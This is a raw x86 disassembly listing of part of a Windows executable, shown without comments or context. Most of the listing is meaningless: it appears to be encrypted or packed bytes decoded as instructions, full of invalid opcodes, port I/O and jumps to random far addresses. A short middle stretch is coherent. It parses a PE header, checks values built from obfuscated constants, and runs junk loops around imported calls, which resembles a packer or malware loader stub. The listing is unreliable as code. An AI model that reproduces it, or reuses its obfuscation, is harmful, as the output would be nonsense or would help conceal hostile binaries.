  4179b8:	std    
  4179b9:	(bad)  
  4179ba:	mov    ebx,0xfeefa56
  4179bf:	nop
  4179c0:	das    
  4179c1:	out    dx,al
  4179c2:	and    edi,ebx
  4179c4:	cmp    eax,0xdb86a82b
  4179c9:	add    BYTE PTR [eax],0xa3
  4179cc:	cld    
  4179cd:	cmp    BYTE PTR [ebp-0x711c50ce],0x9f
  4179d4:	mov    DWORD PTR [esi],edx
  4179d6:	cdq    
  4179d7:	sub    DWORD PTR [ebx-0xfbb2a4e],esi
  4179dd:	mov    ah,0x50
  4179df:	imul   edx,DWORD PTR [ebx+edx*1],0xffffffa9
  4179e3:	mov    ch,0x95
  4179e5:	sbb    bh,BYTE PTR [ebp+edi*8-0x1]
  4179e9:	mov    edi,0x68715721
  4179ee:	jle    0x4179af
  4179f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179f2:	jle    0x417a5c
  4179f4:	cwde   
  4179f5:	mov    al,ds:0x2e657b7f
  4179fa:	mov    esi,0x922a2ded
  4179ff:	xchg   ebp,eax
  417a00:	scas   eax,DWORD PTR es:[edi]
  417a01:	lahf   
  417a02:	shr    BYTE PTR [esi-0x26],1
  417a05:	add    esi,ecx
  417a07:	xlat   BYTE PTR ds:[ebx]
  417a08:	xchg   esp,eax
  417a09:	imul   ecx,DWORD PTR [ebp-0x33],0xbaf1c369
  417a10:	xchg   ebx,eax
  417a11:	sbb    eax,0xcc5e2266
  417a16:	adc    DWORD PTR [ebp-0x3e4be73c],0xffffff81
  417a1d:	xchg   ebp,eax
  417a1e:	and    DWORD PTR [edi-0x24],edi
  417a21:	xchg   edi,eax
  417a22:	pop    esp
  417a23:	in     eax,dx
  417a24:	jo     0x4179ce
  417a26:	push   0x2b
  417a28:	mov    DWORD PTR [ecx+eiz*1+0x4cd09822],esi
  417a2f:	pop    ebx
  417a30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a31:	loop   0x417a26
  417a33:	shr    DWORD PTR [edi],0x5
  417a36:	dec    esp
  417a37:	fdivr  DWORD PTR [ecx+0xe5c58b8]
  417a3d:	sbb    esp,DWORD PTR [edx+0x591fb461]
  417a43:	jno    0x417a5c
  417a45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a46:	mov    dh,0x6f
  417a48:	icebp  
  417a49:	push   ebx
  417a4a:	loopne 0x417a5d
  417a4c:	mov    es,esp
  417a4e:	fdiv   DWORD PTR [esi]
  417a50:	shr    ecx,cl
  417a52:	fdivr  st(0),st
  417a54:	call   ebp
  417a56:	push   ebx
  417a57:	inc    edx
  417a58:	cmp    al,0xd4
  417a5a:	jne    0x417a28
  417a5c:	rcr    DWORD PTR [edx],0x33
  417a5f:	and    eax,0xbec32def
  417a64:	jle    0x417a43
  417a66:	xchg   ebp,eax
  417a67:	add    ch,BYTE PTR [ebx-0x54]
  417a6a:	out    dx,al
  417a6b:	add    bl,BYTE PTR [edx-0x8]
  417a6e:	jmp    0x417ae0
  417a70:	xchg   edx,eax
  417a71:	jno    0x417ab9
  417a73:	nop
  417a74:	lahf   
  417a75:	and    al,0xb0
  417a77:	retf   0x27b
  417a7a:	mov    eax,ds:0x63dc5e4
  417a7f:	cmp    ecx,DWORD PTR [eax+0xf]
  417a82:	fwait
  417a83:	int3   
  417a84:	lahf   
  417a85:	out    dx,al
  417a86:	ja     0x417ac1
  417a88:	rcl    BYTE PTR [ebx],1
  417a8a:	rcl    DWORD PTR [ecx+0x58],1
  417a8d:	jo     0x417a8c
  417a8f:	push   eax
  417a90:	mov    ds:0x6649da93,al
  417a95:	addr16 out 0x46,al
  417a98:	jb     0x417afe
  417a9a:	test   eax,esi
  417a9c:	lock lds esi,FWORD PTR [eax+0x32]
  417aa0:	xchg   edx,eax
  417aa1:	and    al,BYTE PTR [eax-0x69fc4623]
  417aa7:	mov    eax,0x31bc07cb
  417aac:	daa    
  417aad:	call   0x9a44119b
  417ab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ab3:	cmc    
  417ab4:	mov    edx,0xfdfb4102
  417ab9:	xor    DWORD PTR [eax-0x5b3c2788],esi
  417abf:	sub    eax,0xc84f78d2
  417ac4:	sub    ecx,DWORD PTR [edi]
  417ac6:	pushf  
  417ac7:	test   DWORD PTR [eax-0x33f2d0a2],eax
  417acd:	bound  eax,QWORD PTR [edi+0x7d1a537c]
  417ad3:	jb     0x417a67
  417ad5:	loope  0x417acd
  417ad7:	call   0x8f16b115
  417adc:	pop    ebx
  417add:	pop    esi
  417ade:	or     eax,DWORD PTR [ecx]
  417ae0:	lods   al,BYTE PTR ds:[esi]
  417ae1:	imul   DWORD PTR [esi+0x1f363693]
  417ae7:	ret    0xc6bc
  417aea:	jnp    0x417a80
  417aec:	sub    DWORD PTR [ebx+edi*1+0x60],esp
  417af0:	fist   DWORD PTR [ecx-0x7b]
  417af3:	jg     0x417ace
  417af5:	add    bl,BYTE PTR [eax+eax*4+0x5cfa0122]
  417afc:	icebp  
  417afd:	pop    ecx
  417afe:	xchg   dl,al
  417b00:	xchg   edx,eax
  417b01:	cmp    bh,BYTE PTR [ecx-0x3]
  417b04:	jne    0x417b78
  417b06:	push   ecx
  417b07:	push   cs
  417b08:	popa   
  417b09:	mov    al,ds:0x60d41774
  417b0e:	icebp  
  417b0f:	cmp    ah,al
  417b11:	cwde   
  417b12:	fild   DWORD PTR [eax-0x36]
  417b15:	stos   BYTE PTR es:[edi],al
  417b16:	outs   dx,BYTE PTR ds:[esi]
  417b17:	mov    eax,ds:0xc2d44ff6
  417b1c:	add    DWORD PTR [ebx],ebp
  417b1e:	mov    ch,0xb1
  417b20:	and    eax,0x34c35c5
  417b25:	sbb    DWORD PTR [edi+0x77],esi
  417b28:	cli    
  417b29:	jnp    0x417b71
  417b2b:	in     eax,0xd
  417b2d:	mov    ch,0x6
  417b2f:	sub    ebx,DWORD PTR [eax-0x4c]
  417b32:	mov    ds:0x2427f61f,al
  417b37:	scas   eax,DWORD PTR es:[edi]
  417b38:	add    BYTE PTR [ecx+ebp*4+0x25],al
  417b3c:	popf   
  417b3d:	ret    
  417b3e:	push   esp
  417b3f:	fs loop 0x417b0f
  417b42:	mov    eax,0xd97f0057
  417b47:	xchg   esp,eax
  417b48:	lock mov DWORD PTR [edi+0x47],edx
  417b4c:	dec    ebp
  417b4d:	in     al,dx
  417b4e:	test   al,0xcf
  417b50:	add    eax,0x48da7876
  417b55:	out    dx,al
  417b56:	retf   0x2daa
  417b59:	jo     0x417b8b
  417b5b:	outs   dx,DWORD PTR ds:[esi]
  417b5c:	outs   dx,BYTE PTR ds:[esi]
  417b5d:	inc    edi
  417b5e:	cmp    dh,ah
  417b60:	push   0x15
  417b62:	std    
  417b63:	pop    ecx
  417b64:	pop    WORD PTR [ebp+ecx*1-0xa5bb08c]
  417b6c:	jmp    0xa75e:0x36b86094
  417b73:	mov    bh,0xfc
  417b75:	push   ebx
  417b76:	(bad)  
  417b77:	lods   eax,DWORD PTR ds:[esi]
  417b78:	(bad)  
  417b79:	mov    ecx,0x7c478e8
  417b7e:	jnp    0x417b30
  417b80:	cmp    eax,0xfa037699
  417b85:	fdiv   DWORD PTR [esi]
  417b87:	pop    ebx
  417b88:	aaa    
  417b89:	test   ecx,edx
  417b8b:	mov    al,BYTE PTR [edx+0x4f]
  417b8e:	jge    0x417b70
  417b90:	xlat   BYTE PTR ds:[ebx]
  417b91:	inc    edx
  417b92:	xchg   esp,eax
  417b93:	jno    0x417b9b
  417b95:	inc    edx
  417b96:	mov    ecx,0x66a400de
  417b9b:	retf   0x8feb
  417b9e:	or     edi,edi
  417ba0:	ror    al,cl
  417ba2:	imul   eax,DWORD PTR [edi-0x26],0xfd0ee9ac
  417ba9:	xor    BYTE PTR [ebx+0x75],cl
  417bac:	xchg   cl,dh
  417bae:	mov    al,0xb5
  417bb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bb1:	hlt    
  417bb2:	jp     0x417b7e
  417bb4:	cli    
  417bb5:	fidiv  WORD PTR [eax-0x4]
  417bb8:	inc    ebp
  417bb9:	js     0x417c14
  417bbb:	xchg   BYTE PTR [edx-0x67],al
  417bbe:	neg    ebx
  417bc0:	xor    eax,0x49a64846
  417bc5:	fs (bad) 
  417bc7:	cmp    al,0x48
  417bc9:	xchg   edi,eax
  417bca:	aas    
  417bcb:	popa   
  417bcc:	inc    edi
  417bcd:	lahf   
  417bce:	mov    dl,0x78
  417bd0:	or     bh,BYTE PTR [ebx-0x3e]
  417bd3:	pop    ss
  417bd4:	mov    al,0x13
  417bd6:	(bad)  
  417bd7:	std    
  417bd8:	fstp   DWORD PTR [edi+0x53]
  417bdb:	arpl   WORD PTR [ebx+0x1],di
  417bde:	jmp    0x417b63
  417be0:	pop    edi
  417be1:	pop    es
  417be2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417be3:	adc    al,BYTE PTR [ecx]
  417be5:	adc    ebp,DWORD PTR [edx+0x79]
  417be8:	fstp   QWORD PTR [ecx-0x34]
  417beb:	inc    eax
  417bec:	js     0x417c20
  417bee:	in     al,dx
  417bef:	imul   bl
  417bf1:	test   al,0xc7
  417bf3:	iret   
  417bf4:	in     eax,dx
  417bf5:	je     0x417c64
  417bf7:	out    0xce,eax
  417bf9:	inc    ebp
  417bfa:	ret    
  417bfb:	mov    ch,0xa
  417bfd:	adc    eax,0x44d7fab4
  417c02:	repz retf 
  417c04:	mov    al,ds:0xc41f0f4e
  417c09:	out    dx,al
  417c0a:	mov    ah,BYTE PTR [ecx]
  417c0c:	jnp    0x417bb8
  417c0e:	dec    esp
  417c0f:	lods   eax,DWORD PTR ds:[esi]
  417c10:	mov    ds:0xfe863fcf,eax
  417c15:	sbb    dh,al
  417c17:	adc    BYTE PTR [ebx],0xf0
  417c1a:	pushf  
  417c1b:	cmp    DWORD PTR [ecx+0xf],eax
  417c1e:	push   esp
  417c1f:	dec    eax
  417c20:	adc    al,0x19
  417c22:	ror    DWORD PTR [ecx],0x31
  417c25:	(bad)  
  417c26:	pushw  0x94aa
  417c2a:	or     edi,DWORD PTR [edi+0x21]
  417c2d:	mov    WORD PTR [edx-0x73cd42b3],ds
  417c33:	and    ecx,ebp
  417c35:	dec    di
  417c37:	sbb    DWORD PTR [ebx+0x6],ebx
  417c3a:	mov    bl,0x61
  417c3c:	nop
  417c3d:	xchg   edx,eax
  417c3e:	sbb    eax,0x18e5e24d
  417c43:	jp     0x417c12
  417c45:	fisubr WORD PTR [ecx+0x4e]
  417c48:	pop    edi
  417c49:	fmul   st(4),st
  417c4b:	or     DWORD PTR ds:0x653306d8,eax
  417c51:	neg    BYTE PTR ds:0x55d4cddc
  417c57:	push   esi
  417c58:	gs adc ebx,ecx
  417c5b:	push   0xbd41d867
  417c60:	ja     0x417c84
  417c62:	jmp    0xf1de:0xa391cb75
  417c69:	je     0x417ce7
  417c6b:	test   al,0xd9
  417c6d:	cmp    esp,DWORD PTR [eax]
  417c6f:	pandn  mm3,QWORD PTR [edx]
  417c72:	ins    BYTE PTR es:[edi],dx
  417c73:	mov    cl,0x49
  417c75:	dec    edi
  417c76:	sbb    DWORD PTR [esi-0x18037e89],ebx
  417c7c:	and    cl,bl
  417c7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c7f:	mov    ds:0xbd42adc6,al
  417c84:	add    eax,0x870b03ae
  417c89:	cwde   
  417c8a:	xor    DWORD PTR [ebp-0x40],edx
  417c8d:	jle    0x417c91
  417c8f:	repz add eax,0x4c243501
  417c95:	orps   xmm0,XMMWORD PTR [ecx-0x67]
  417c99:	jne    0x417cc3
  417c9b:	dec    eax
  417c9c:	sbb    eax,0xa036d254
  417ca1:	out    dx,eax
  417ca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ca3:	inc    edx
  417ca4:	inc    ebx
  417ca5:	pop    ebp
  417ca6:	popf   
  417ca7:	jnp    0x417c43
  417ca9:	add    DWORD PTR [ebp+0x76],eax
  417cac:	sub    ebx,DWORD PTR [ebp-0xfe8f0c4]
  417cb2:	dec    ebx
  417cb3:	add    ah,BYTE PTR [ecx+edx*4+0x7e]
  417cb7:	inc    esp
  417cb8:	pop    edx
  417cb9:	test   BYTE PTR [edx],0x9c
  417cbc:	gs dec ecx
  417cbe:	fbstp  TBYTE PTR [esi-0x5f]
  417cc1:	stos   DWORD PTR es:[edi],eax
  417cc2:	xchg   dl,cl
  417cc4:	or     bh,BYTE PTR [eax-0x3c]
  417cc7:	cmp    DWORD PTR [edi+0x66],ecx
  417cca:	and    eax,0xdf10cba9
  417ccf:	out    0x4f,al
  417cd1:	in     eax,0x8
  417cd3:	ja     0x417d46
  417cd5:	jmp    0x137e:0xdf691e94
  417cdc:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cde:	ret    0xb71a
  417ce1:	mov    esp,0xae856618
  417ce6:	cmp    eax,0x3a69246b
  417ceb:	(bad)  
  417cec:	fisub  DWORD PTR [ebp+0xdc13084]
  417cf2:	ss sti 
  417cf4:	inc    ebp
  417cf5:	push   0xffffffa6
  417cf7:	pop    ecx
  417cf8:	mov    al,0x32
  417cfa:	mov    edi,0xb4810f51
  417cff:	or     al,0x54
  417d01:	pop    ss
  417d02:	mov    ah,0x60
  417d04:	xor    al,cl
  417d06:	fdivr  QWORD PTR [ecx+edi*8]
  417d09:	and    BYTE PTR [ebp+0x363a7236],cl
  417d0f:	jmp    0xdae2:0xce82cd4c
  417d16:	cmp    eax,0xc754bca4
  417d1b:	inc    edx
  417d1c:	fist   DWORD PTR [ebp+0x3d879387]
  417d22:	sub    eax,0xf2746ad3
  417d27:	xlat   BYTE PTR ds:[ebx]
  417d28:	ins    BYTE PTR es:[edi],dx
  417d29:	adc    ch,BYTE PTR [edx-0x565395e7]
  417d2f:	addr16 push esi
  417d31:	dec    esp
  417d32:	shl    DWORD PTR [esi-0x14],cl
  417d35:	mov    al,ds:0x81dda316
  417d3a:	mov    ebp,0x1d87e3d3
  417d3f:	retf   0x6ec5
  417d42:	jge    0x417d81
  417d44:	jnp    0x417d21
  417d46:	mov    edx,0x9e52d95
  417d4b:	rcr    BYTE PTR [esi+0x25eb9098],1
  417d51:	xchg   ebp,eax
  417d52:	adc    DWORD PTR [ebx-0x2e],0x3c5214b
  417d59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d5a:	sbb    al,0x53
  417d5c:	jae    0x417dcb
  417d5e:	push   DWORD PTR [edi-0x320e78e4]
  417d64:	xor    eax,0x66ae5ef7
  417d69:	call   0x5b835ac2
  417d6e:	inc    ebp
  417d6f:	fidiv  DWORD PTR [eax+0xca293b6]
  417d75:	add    al,0x60
  417d77:	pop    ebp
  417d78:	mov    edi,0x94497abd
  417d7d:	push   ecx
  417d7e:	fiadd  WORD PTR [edx+0x6b07b165]
  417d84:	retf   0x2c81
  417d87:	retf   
  417d88:	cmp    dh,bh
  417d8a:	fisttp QWORD PTR [ebp-0x1427041c]
  417d90:	out    dx,al
  417d91:	mov    ebp,0x6ba1beea
  417d96:	xchg   BYTE PTR [edx-0x7c09ee11],ch
  417d9c:	shr    ebp,1
  417d9e:	sbb    eax,0xe0433542
  417da3:	jo     0x417d46
  417da5:	push   edx
  417da6:	xor    eax,0x79ea3d12
  417dab:	cmp    eax,0xe08c26f2
  417db0:	je     0x417d47
  417db2:	lods   eax,DWORD PTR ds:[esi]
  417db3:	ins    BYTE PTR es:[edi],dx
  417db4:	dec    edx
  417db5:	push   es
  417db6:	clc    
  417db7:	add    al,0x2b
  417db9:	cmc    
  417dba:	sbb    BYTE PTR ds:0xabbbf47b,bh
  417dc0:	sti    
  417dc1:	into   
  417dc2:	sub    bl,BYTE PTR [esi-0x1d38da76]
  417dc8:	arpl   WORD PTR [eax+eiz*4],bp
  417dcb:	int3   
  417dcc:	retf   0x4f90
  417dcf:	gs out 0x1b,al
  417dd2:	pop    esi
  417dd3:	dec    ebp
  417dd4:	ss cmc 
  417dd6:	xchg   ebp,eax
  417dd7:	inc    ebp
  417dd8:	cmp    BYTE PTR [esi-0x4b3bda5c],dh
  417dde:	and    BYTE PTR ds:0x42632213,ch
  417de4:	inc    ebp
  417de5:	fdivr  DWORD PTR [edx-0x3b751404]
  417deb:	sub    esi,ebp
  417ded:	jmp    0x14eeda12
  417df2:	pop    edi
  417df3:	idiv   DWORD PTR [edx-0x27]
  417df6:	mov    cl,BYTE PTR [eax-0x67]
  417df9:	iret   
  417dfa:	jns    0x417dc2
  417dfc:	push   ds
  417dfd:	lock clc 
  417dff:	sub    BYTE PTR ds:0x3129349f,0x88
  417e06:	add    eax,0x942227fa
  417e0b:	sbb    esp,DWORD PTR [ebp+eax*4-0x72]
  417e0f:	scas   eax,DWORD PTR es:[edi]
  417e10:	fsub   DWORD PTR [esi]
  417e12:	gs into 
  417e14:	push   ebp
  417e15:	and    DWORD PTR [ebx-0x584bc631],esi
  417e1b:	arpl   WORD PTR [ecx],si
  417e1d:	or     DWORD PTR [ecx],eax
  417e1f:	(bad)  [edi+0x4bd80045]
  417e25:	or     ebx,DWORD PTR ds:0x6510f47c
  417e2b:	cwde   
  417e2c:	inc    eax
  417e2d:	adc    eax,0xf9d8eba1
  417e32:	mov    eax,ds:0x25b74b24
  417e37:	fwait
  417e38:	cmp    al,0xee
  417e3a:	neg    dl
  417e3c:	mov    WORD PTR [ebx+ebx*4-0x42],es
  417e40:	dec    esp
  417e41:	mov    ?,WORD PTR [edi]
  417e43:	push   eax
  417e44:	test   DWORD PTR fs:[ecx-0x47],esi
  417e48:	aaa    
  417e49:	or     eax,0xbd44f4fe
  417e4e:	imul   edx,DWORD PTR [esi-0x27],0x28
  417e52:	ins    BYTE PTR es:[edi],dx
  417e53:	arpl   WORD PTR [ebx+0x7f541535],bp
  417e59:	fs pop ss
  417e5b:	outs   dx,DWORD PTR ds:[esi]
  417e5c:	ficomp WORD PTR [esi-0x62a2ac4b]
  417e62:	inc    ecx
  417e63:	ret    
  417e64:	pop    ds
  417e65:	div    DWORD PTR [ebx]
  417e67:	push   cs
  417e68:	das    
  417e69:	jmp    0x417ecd
  417e6b:	sbb    al,0x9a
  417e6d:	mov    ch,0x37
  417e6f:	aad    0x80
  417e71:	cmc    
  417e72:	mov    cl,0x1a
  417e74:	push   ds
  417e75:	aad    0xb3
  417e77:	sbb    BYTE PTR [eax+0x2a],0xc7
  417e7b:	dec    ebx
  417e7c:	push   cs
  417e7d:	and    BYTE PTR [eax+0x45],al
  417e80:	adc    al,0x62
  417e82:	rcr    esi,1
  417e84:	mov    esi,0xe5d6b6d7
  417e89:	test   DWORD PTR [ecx+ecx*8-0x46e84108],ebp
  417e90:	stos   BYTE PTR es:[edi],al
  417e91:	das    
  417e92:	mov    al,0xac
  417e94:	mov    ah,0x8c
  417e96:	in     eax,0x55
  417e98:	jmp    0x417eac
  417e9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e9b:	mov    BYTE PTR [eax+ebp*8+0x16d1ec3e],bl
  417ea2:	dec    ecx
  417ea3:	mov    al,0x1c
  417ea5:	sbb    edx,DWORD PTR [ecx]
  417ea7:	dec    esi
  417ea8:	inc    ebx
  417ea9:	loopne 0x417e47
  417eab:	scas   eax,DWORD PTR es:[edi]
  417eac:	aas    
  417ead:	sbb    ebp,DWORD PTR [ecx+0x1b]
  417eb0:	mov    DWORD PTR [ebp-0x51692531],edi
  417eb6:	xor    edx,eax
  417eb8:	ss icebp 
  417eba:	mov    cl,0xee
  417ebc:	loopne 0x417f36
  417ebe:	dec    esp
  417ebf:	ins    BYTE PTR es:[edi],dx
  417ec0:	xor    DWORD PTR [esi+0x4a],ebp
  417ec3:	das    
  417ec4:	ret    0x9933
  417ec7:	or     al,ch
  417ec9:	dec    ebx
  417eca:	mov    DWORD PTR [ebp+edx*2-0x72e4195b],0xbcde8bc4
  417ed5:	and    DWORD PTR [ecx+0x118ed870],ebx
  417edb:	push   ebx
  417edc:	pop    edx
  417edd:	xor    eax,0x82f9e440
  417ee2:	mov    ah,0xec
  417ee4:	mov    esi,0x7ac7fadb
  417ee9:	jp     0x417e8d
  417eeb:	inc    esi
  417eec:	xor    eax,0xb825ba9
  417ef1:	mov    dl,BYTE PTR [edx-0x600f6682]
  417ef7:	in     al,0xf8
  417ef9:	cmp    cl,dh
  417efb:	xor    DWORD PTR ds:0xe4674ec2,ebp
  417f01:	xchg   esi,eax
  417f02:	add    dl,BYTE PTR ds:0xc9e58aba
  417f08:	push   ecx
  417f09:	shr    ch,0x1b
  417f0c:	out    0xc4,al
  417f0e:	sub    BYTE PTR [edx-0x51],bh
  417f11:	add    al,0x1c
  417f13:	inc    ebx
  417f14:	push   esi
  417f15:	sub    BYTE PTR [ecx+0x12e2a7d4],ah
  417f1b:	ins    BYTE PTR es:[edi],dx
  417f1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f1d:	or     eax,0xb4be9553
  417f22:	cmp    dl,BYTE PTR [edx-0x76]
  417f25:	add    BYTE PTR [ecx+0x42900405],al
  417f2b:	add    BYTE PTR [esi+0x24],cl
  417f2e:	add    BYTE PTR [eax],al
  417f30:	add    al,0xd
  417f32:	xor    DWORD PTR ds:0x429014,0x42600c
  417f3c:	xor    al,0x6f
  417f3e:	mov    DWORD PTR ds:0x427010,0x5834
  417f48:	cmp    al,0x35
  417f4a:	jne    0x417f8f
  417f50:	mov    eax,DWORD PTR [ebp+0x8]
  417f53:	mov    ecx,DWORD PTR [ebp+0x8]
  417f56:	add    ecx,DWORD PTR [eax+0x3c]
  417f59:	mov    edx,0x7510893
  417f5e:	mov    DWORD PTR [ebp+0x8],ecx
  417f61:	mov    eax,DWORD PTR [ebp-0x4]
  417f64:	xor    eax,edx
  417f66:	push   esi
  417f67:	mov    esi,DWORD PTR [ebp+0x8]
  417f6a:	mov    ecx,0x3272db
  417f6f:	add    eax,ecx
  417f71:	cmp    DWORD PTR [esi+0x54],eax
  417f74:	pop    esi
  417f75:	je     0x417f83
  417f7b:	mov    eax,DWORD PTR [ebp+0x8]
  417f7e:	jmp    0x417f9c
  417f83:	mov    eax,DWORD PTR [ebp-0x4]
  417f86:	xor    eax,edx
  417f88:	add    eax,ecx
  417f8a:	jmp    0x417f9c
  417f8f:	mov    eax,DWORD PTR [ebp-0x4]
  417f92:	xor    eax,0x7510893
  417f97:	add    eax,0x3272db
  417f9c:	leave  
  417f9d:	ret    0x4
  417fa0:	push   ebp
  417fa1:	mov    ebp,esp
  417fa3:	push   ecx
  417fa4:	push   ecx
  417fa5:	mov    DWORD PTR ds:0x425024,0x14
  417faf:	cmp    DWORD PTR ds:0x425024,0x0
  417fb6:	je     0x417ff0
  417fbc:	cmp    DWORD PTR ds:0x425024,0x1c
  417fc3:	jne    0x417fdc
  417fc9:	push   DWORD PTR [ebp-0xc]
  417fcc:	push   0x427000
  417fd1:	push   0x4617
  417fd6:	call   DWORD PTR ds:0x421034
  417fdc:	xor    edx,edx
  417fde:	add    edx,DWORD PTR ds:0x425024
  417fe4:	dec    edx
  417fe5:	mov    DWORD PTR ds:0x425024,edx
  417feb:	jmp    0x417faf
  417ff0:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  417ff7:	mov    DWORD PTR ds:0x428010,0x1b
  418001:	cmp    DWORD PTR ds:0x428010,0x0
  418008:	je     0x41803b
  41800e:	cmp    DWORD PTR ds:0x428010,0x20
  418015:	jne    0x418029
  41801b:	push   DWORD PTR [ebp-0x1c]
  41801e:	push   0x4a52
  418023:	call   DWORD PTR ds:0x421038
  418029:	mov    ecx,DWORD PTR ds:0x428010
  41802f:	dec    ecx
  418030:	mov    DWORD PTR ds:0x428010,ecx
  418036:	jmp    0x418001
  41803b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  418042:	mov    eax,DWORD PTR [ebp-0x4]
  418045:	add    edx,0xdc
  41804b:	push   esi
  41804c:	mov    edx,DWORD PTR ds:0x42004b
  418052:	xor    ecx,ecx
  418054:	add    ecx,DWORD PTR ds:0x41d1dc
  41805a:	sub    ecx,edx
  41805c:	and    edx,DWORD PTR [edx+ecx*1]
  41805f:	mov    esi,DWORD PTR [ebp-0x8]
  418062:	add    DWORD PTR ds:0x429010,0x2693
  41806c:	mov    edx,0x7510893
  418071:	xor    eax,edx
  418073:	xor    esi,edx
  418075:	and    DWORD PTR ds:0x42901c,0x0
  41807f:	jmp    0x418091
  418084:	mov    ecx,DWORD PTR ds:0x42901c
  41808a:	inc    ecx
  41808b:	mov    DWORD PTR ds:0x42901c,ecx
  418091:	cmp    DWORD PTR ds:0x42901c,0x17
  418098:	jae    0x4180e3
  41809e:	cmp    DWORD PTR ds:0x42901c,0xb
  4180a5:	jne    0x4180c4
  4180ab:	push   DWORD PTR [ebp-0x10]
  4180ae:	push   0x8d74
  4180b3:	push   0x428004
  4180b8:	push   DWORD PTR [ebp-0x10]
  4180bb:	push   DWORD PTR [ebp-0x14]
  4180be:	call   DWORD PTR ds:0x421000
  4180c4:	cmp    DWORD PTR ds:0x42901c,0xa
  4180cb:	jne    0x4180de
  4180d1:	mov    ecx,DWORD PTR ds:0x42901c
  4180d7:	inc    ecx
  4180d8:	mov    DWORD PTR ds:0x42901c,ecx
  4180de:	jmp    0x418084
  4180e3:	mov    ecx,0x3272db
  4180e8:	add    esi,ecx
  4180ea:	add    eax,ecx
  4180ec:	imul   eax,esi
  4180ef:	mov    esi,DWORD PTR [ebp+0xc]
  4180f2:	cmp    esi,eax
  4180f4:	jne    0x41a4c2
  4180fa:	mov    eax,DWORD PTR [ebp-0x4]
  4180fd:	mov    esi,DWORD PTR [ebp-0x8]
  418100:	xor    eax,edx
  418102:	jmp    0x41a4b4
  418107:	mov    esp,0x2510558f
  41810c:	sub    DWORD PTR fs:[ebx-0x5f],0xffffff83
  418111:	mov    al,0xb8
  418113:	int    0x4f
  418115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418116:	pop    ebp
  418117:	std    
  418118:	and    al,0x61
  41811a:	(bad)  
  41811b:	int    0x5f
  41811d:	bound  esp,QWORD PTR [edx+0x0]
  418120:	mov    bh,0xf0
  418122:	sbb    cl,dl
  418124:	pop    ds
  418125:	mov    ah,0xe0
  418127:	fiadd  DWORD PTR [esi]
  418129:	sub    ebp,DWORD PTR [edi-0x5b80dfcf]
  41812f:	in     eax,dx
  418130:	push   esp
  418131:	scas   eax,DWORD PTR es:[edi]
  418132:	jne    0x418142
  418134:	xor    edx,ebp
  418136:	mov    ds:0xd23b3dad,al
  41813b:	jmp    FWORD PTR [ecx]
  41813d:	sub    DWORD PTR [ebx],ebx
  41813f:	jo     0x418128
  418141:	push   cs
  418142:	xchg   esp,eax
  418143:	xchg   BYTE PTR [edx+0x4f],dl
  418146:	sub    ch,BYTE PTR [eax-0xdb4cc9c]
  41814c:	jmp    0x1eea:0xb1833a30
  418153:	icebp  
  418154:	out    0xd0,al
  418156:	(bad)  
  418157:	cld    
  418158:	mov    DWORD PTR [ecx],edi
  41815a:	xor    eax,0x4f07b31
  41815f:	stos   DWORD PTR es:[edi],eax
  418160:	adc    DWORD PTR [ebx+0x6d],esi
  418163:	aas    
  418164:	sub    ebx,esp
  418166:	and    esi,DWORD PTR ds:0x25f7816e
  41816c:	jns    0x4181c0
  41816e:	lahf   
  41816f:	(bad)  
  418170:	jmp    0x4181f0
  418172:	ret    0x1179
  418175:	rcr    DWORD PTR [edx],0x45
  418178:	gs adc al,0x21
  41817b:	mov    ch,BYTE PTR [edi-0x62]
  41817e:	call   0x329f:0xec718665
  418185:	adc    dl,BYTE PTR [ebx-0x62bb6c3e]
  41818b:	or     eax,0x41f9ffb9
  418190:	sahf   
  418191:	fisubr WORD PTR [edx]
  418193:	adc    edx,ebp
  418195:	aam    0xb4
  418197:	mov    DWORD PTR [ecx-0x2],ebp
  41819a:	mov    cs,WORD PTR [edi+0x3a]
  41819d:	shl    DWORD PTR [esi+edi*8],cl
  4181a0:	(bad)  
  4181a2:	sbb    eax,DWORD PTR [edi+edi*4+0x50]
  4181a6:	(bad)  
  4181a8:	mov    edx,0x3e5581a8
  4181ad:	inc    ebp
  4181ae:	pushf  
  4181af:	ret    0x515e
  4181b2:	cld    
  4181b3:	sub    DWORD PTR [ebx-0x21],ecx
  4181b6:	add    dh,BYTE PTR [ecx-0x68fd8517]
  4181bc:	in     eax,0x2
  4181be:	dec    eax
  4181bf:	(bad)  
  4181c0:	in     al,dx
  4181c1:	pop    esp
  4181c2:	(bad)  
  4181c3:	xchg   ecx,eax
  4181c4:	push   esp
  4181c5:	mov    esi,0xbfa4da4e
  4181ca:	adc    BYTE PTR [esi],bl
  4181cc:	fucomi st,st(4)
  4181ce:	xchg   BYTE PTR [eax+eax*8],dh
  4181d1:	cmp    cl,dl
  4181d3:	cmp    eax,0xaf7d4ff8
  4181d8:	fadd   QWORD PTR [edi+0x12cc7f6e]
  4181de:	mov    bl,0x46
  4181e0:	sub    BYTE PTR [esi+0x3190148e],0x78
  4181e7:	fdivr  QWORD PTR [eax]
  4181e9:	cld    
  4181ea:	pusha  
  4181eb:	mov    eax,ds:0xdd390df1
  4181f0:	test   al,0x6d
  4181f2:	push   ebp
  4181f3:	and    al,0x68
  4181f5:	icebp  
  4181f6:	iret   
  4181f7:	loop   0x41818e
  4181f9:	jnp    0x418238
  4181fb:	lock mov esp,ebp
  4181fe:	stc    
  4181ff:	or     BYTE PTR [ecx+0x51],dl
  418202:	sbb    eax,0x9e768c4c
  418207:	sub    edx,ebp
  418209:	sbb    ebx,DWORD PTR [ebx+0x34]
  41820c:	inc    esi
  41820d:	mov    ch,0xf3
